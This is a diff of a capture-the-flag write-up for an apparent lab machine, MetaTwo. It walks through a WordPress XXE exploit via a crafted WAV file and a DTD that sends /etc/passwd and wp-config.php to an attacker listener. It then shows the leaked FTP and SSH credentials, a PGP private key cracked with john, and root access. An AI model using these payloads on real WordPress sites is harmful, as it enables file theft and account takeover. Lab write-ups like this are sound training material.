@@ -9,7 +9,7 @@
 PORT   STATE SERVICE VERSION                                                                                                                                 
 21/tcp open  ftp                                                                                                                                             
 | fingerprint-strings:                                                                                                                                       
-|   GenericLines:                                                                                                                                            
+|       GenericLines:                                                                                                                                            
 |     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]                                                                                                      
 |     Invalid command: try being more creative
 |_    Invalid command: try being more creative
@@ -72,20 +72,31 @@ manager $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
 manager:partylikearockstar
 
 ### WordPress Authenticated Blind XXE Vulnerability 
+
 A user with the ability to upload files (like an Author) can exploit an XML parsing issue in the Media Library leading to XXE attacks. WordPress used an audio parsing library called ID3 that was affected by an XML External Entity (XXE) vulnerability affecting PHP versions 8 and above.
 
 This particular vulnerability could be triggered when parsing WAVE audio files. 
-<b>payload.wav</b>
-`echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.11:6666/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > evilsound.wav`
-<b>xxe.dtd:</b>
+
 ```
+
+$ echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.11:6666/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > evilsound.wav
+
+```
+
+<b>evil.dtd:</b>
+
+```
+
 <!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
 <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.11:6666/?p=%file;'>" >
+
 ```
-<b>php listener</b>
+
+<b>php server:</b>
 `$ php -S 0.0.0.0:6666`
 
 Now login with your creds and try to upload the .wav file in the media page and the output from the php lister would look like this: 
+
 ```
 [Fri Jan  6 09:05:13 2023] 10.10.11.186:33898 [404]: GET /?p=jVRNj5swEL3nV3BspUSGkGSDj22lXjaVuum9MuAFusamNiShv74zY8gmgu5WHt
 B8vHkezxisMS2/8BCWRZX5d1pplgpXLnIha6MBEcEaDNY5yxxAXjWmjTJFpRfovfA1LIrPg1zvABTDQo3l8jQL0hmgNny33cYbTiYbSRmai0LUEpm2fBdybxDPj
@@ -94,12 +105,21 @@ Rrk6aBuw5mYtspcOq4LxgAwmJXh97iCqcnjh4j3KAdpT6SJ4BGdwEFoU0noCgk2zK4t3Ik5QQIc52E4z
 0x3HnlPnMmbmZ1OTYUn8n/XtwAkjLC5Qt9VzlP0XT0gDDIe29BEe15Sst27OxL5QLH2G45kMk+OYjQ+NqoFkul74jA+QNWiudUSdJtGt44ivtk4/Y/yCDz8zB1m
 nniAfuWZi8fzBX5gTfXDtBu6B7iv6lpXL+DxSGoX8NPiqwNLVkI+j1vzUes62gRv8nSZKEnvGcPyAEN0BnpTW6+iPaChneaFlmrMy7uiGuPT0j12cIBV8ghvd3r
 lG9+63oDFseRRE/9Mfvj8FR2rHPdy3DzGehnMRP+LltfLt2d+0aI9O9wE34hyve2RND7xT7Fw== - No such file or directory
+
 ```
+
 as you can see we get a base64 encrypted file to decode it you do this:
+
 <b>decryptBase64.php:</b>
-`<?php echo zlib_decode(base64_decode('jVRNj5swEL3nV3BspUSGkGSDj22lXjaVuum9MuAFusamNiShv74zY8gmgu5WHtB8vHkezxisMS2/8BCWRZX5d1pplgpXLnIha6MBEcEaDNY5yxxAXjWmjTJFpRfovfA1LIrPg1zvABTDQo3l8jQL0hmgNny33cYbTiYbSRmai0LUEpm2fBdybxDPjXpHWQssbsejNUeVnYRlmchKycic4FUD8AdYoBDYNcYoppp8lrxSAN/DIpUSvDbBannGuhNYpN6Qe3uS0XUZFhOFKGTc5Hh7ktNYc+kxKUbx1j8mcj6fV7loBY4lRrk6aBuw5mYtspcOq4LxgAwmJXh97iCqcnjh4j3KAdpT6SJ4BGdwEFoU0noCgk2zK4t3Ik5QQIc52E4zr03AhRYttnkToXxFK/jUFasn2Rjb4r7H3rWyDj6IvK70x3HnlPnMmbmZ1OTYUn8n/XtwAkjLC5Qt9VzlP0XT0gDDIe29BEe15Sst27OxL5QLH2G45kMk+OYjQ+NqoFkul74jA+QNWiudUSdJtGt44ivtk4/Y/yCDz8zB1mnniAfuWZi8fzBX5gTfXDtBu6B7iv6lpXL+DxSGoX8NPiqwNLVkI+j1vzUes62gRv8nSZKEnvGcPyAEN0BnpTW6+iPaChneaFlmrMy7uiGuPT0j12cIBV8ghvd3rlG9+63oDFseRRE/9Mfvj8FR2rHPdy3DzGehnMRP+LltfLt2d+0aI9O9wE34hyve2RND7xT7Fw==')); ?>`
+
+```
+
+<?php echo zlib_decode(base64_decode('jVRNj5swEL3nV3BspUSGkGSDj22lXjaVuum9MuAFusamNiShv74zY8gmgu5WHtB8vHkezxisMS2/8BCWRZX5d1pplgpXLnIha6MBEcEaDNY5yxxAXjWmjTJFpRfovfA1LIrPg1zvABTDQo3l8jQL0hmgNny33cYbTiYbSRmai0LUEpm2fBdybxDPjXpHWQssbsejNUeVnYRlmchKycic4FUD8AdYoBDYNcYoppp8lrxSAN/DIpUSvDbBannGuhNYpN6Qe3uS0XUZFhOFKGTc5Hh7ktNYc+kxKUbx1j8mcj6fV7loBY4lRrk6aBuw5mYtspcOq4LxgAwmJXh97iCqcnjh4j3KAdpT6SJ4BGdwEFoU0noCgk2zK4t3Ik5QQIc52E4zr03AhRYttnkToXxFK/jUFasn2Rjb4r7H3rWyDj6IvK70x3HnlPnMmbmZ1OTYUn8n/XtwAkjLC5Qt9VzlP0XT0gDDIe29BEe15Sst27OxL5QLH2G45kMk+OYjQ+NqoFkul74jA+QNWiudUSdJtGt44ivtk4/Y/yCDz8zB1mnniAfuWZi8fzBX5gTfXDtBu6B7iv6lpXL+DxSGoX8NPiqwNLVkI+j1vzUes62gRv8nSZKEnvGcPyAEN0BnpTW6+iPaChneaFlmrMy7uiGuPT0j12cIBV8ghvd3rlG9+63oDFseRRE/9Mfvj8FR2rHPdy3DzGehnMRP+LltfLt2d+0aI9O9wE34hyve2RND7xT7Fw==')); ?>
+
+```
 
 `$ php decryptBase64`
+
 ```
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -134,12 +154,18 @@ ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
 Now that we have proof that it works we can now try and get some good info.
 
 <b>evil.dtd</b>
+
 ```
+
 <!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=../wp-config.php">
 <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.11:6666/?p=%file;'>" >
+
 ```
+
 run the php session again and upload the file to the media page and you'll get another base64 encrypted text, copy it and paste it in the decryptBase64.php file. The answer:
+
 ```
+
 /** The name of the database for WordPress */
 define( 'DB_NAME', 'blog' );
 
@@ -164,11 +190,14 @@ define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
 define( 'FTP_HOST', 'ftp.metapress.htb' );
 define( 'FTP_BASE', 'blog/' );
 define( 'FTP_SSL', false );
+
 ```
 This is the intersting information from the file. We got the Database and FTP credentials to work with.
 
 ### FTP Enum
+
 ```
+
 $ ftp 10.10.11.186
 Connected to 10.10.11.186.
 220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
@@ -178,20 +207,27 @@ Password: 9NYS_ii@FyL_p5M2NvJ
 230 User metapress.htb logged in
 Remote system type is UNIX.
 Using binary mode to transfer files.
+
 ```
 When login in the ftp server there are 2 folders. Now I just started enumeration entered into the mailer directory and in there, there is a file called `send_email.php` I downloaded it by using the `get` command and read it in my terminal and I saw the user jnelson and his password so I tried to ssh and it worked.
+
 <b>send_email.php:</b>
+
 ```
+
 $mail->Host="mail.metapress.htb";                                                                               
 $mail->SMTPAuth=true;      
 $mail->Username="jnelson@metapress.htb";                                                                        
 $mail->Password="Cb4_JmWM8zUZWMu@Ys";                                                                           
 $mail->SMTPSecure="tls";                                                                                         
 $mail->Port = 587; 
+
 ```
 
 ### SSH
+
 ```
+
 $ ssh jnelson@metapress.htb
 password: 9NYS_ii@FyL_p5M2NvJ
 jnelson@meta2:~$ ip a && id && cat user.txt
@@ -207,15 +243,19 @@ jnelson@meta2:~$ ip a && id && cat user.txt
        valid_lft forever preferred_lft forever
 uid=1000(jnelson) gid=1000(jnelson) groups=1000(jnelson)
 32302809ccf3eabe55c8cf60ee7dc793
+
 ```
 
 ### PrivEsc 
+
 Ok so it wasn't hard to find out that in the .passpie folder(in the home direcotry) there are keys and a message that will probably be the root password, so fistly I copied the all the keys to my machine, the message, the public and the private keys. Now if you didn't notice by know the message and the keys are encrypted. The method of encryption is PGP, so what we want to do is decrypt the message and allegedly get the root's password. 
 
 `$ cd ~/.passpie`
 
 <b>First off, copy all three files:</b> 
+
 1. Public Key 
+
 ```
 -----BEGIN PGP PUBLIC KEY BLOCK-----
 
@@ -260,7 +300,9 @@ fo6KI+w2uXLaw+bIT1XZurDN
 =dqsF
 -----END PGP PUBLIC KEY BLOCK----- 
 ```
+
 2. Private Key
+
 ```
 -----BEGIN PGP PRIVATE KEY BLOCK-----
 
@@ -308,7 +350,9 @@ o3KGdNgA/04lhPjdN3wrzjU3qmrLfo6KI+w2uXLaw+bIT1XZurDN
 =7Uo6
 -----END PGP PRIVATE KEY BLOCK-----
 ```
+
 3. Root Message
+
 ```
 -----BEGIN PGP MESSAGE-----
 
@@ -331,30 +375,24 @@ After copying everything to sepate files you now want to decrypt the message, I'
 1. `$ gpg --import pgpPubKey.gpg`
 2. `$ gpg2john pgpPrvtKey.gpg > gpg.hash`
 3. 	```
-		$ john --wordlist=/usr/share/wordlists/rockyou.txt gpg.hash                           
+		$ john --wordlist=/usr/share/wordlists/rockyou.txt gpg.hash   
+
 		blink182         (Passpie)                    	
-	```
-4.  ```
-	$ gpg --import pgpPrvtKey.gpg                                                             
-	gpg: key 387775C35745D203: "Passpie (Auto-generated by Passpie) <passpie@local>" not changed
-	gpg: key 387775C35745D203: secret key imported                                              
-	gpg: Total number processed: 1                
-	gpg:              unchanged: 1                
-	gpg:       secret keys read: 1                
-	gpg:   secret keys imported: 1 
-	```
+	
+    ```
+
+4.  `$ gpg --import pgpPrvtKey.gpg`
+
 	Enter the passphrase recived in step 3.
-5.  ```
-	$ gpg --output root_message.txt --decrypt rootMsg.gpg                                     
-	gpg: encrypted with 1024-bit ELG key, ID A23EC25F8B5D831A, created 2022-06-26               
-      "Passpie (Auto-generated by Passpie) <passpie@local>"
-	```
+5.  `$ gpg --output root_message.txt --decrypt rootMsg.gpg`
+    
     Same thing enter the passphrase.
-6.  ```
-	$ cat root_message.txt                      
-	p7qfAZt4_A1xo_0x 
-	```
-As you can see we got root's password!
+
+```
+$ cat root_message.txt                      
+p7qfAZt4_A1xo_0x 
+```
+interesting, not really a message, maybe a password?
 
 ### Root login
 
@@ -375,4 +413,5 @@ root@meta2:~# ip a && id && cat root.txt
        valid_lft forever preferred_lft forever
 uid=0(root) gid=0(root) groups=0(root)
 75a6fe7b5fd365ff1f9de8d4aac0ac10
+
 ```
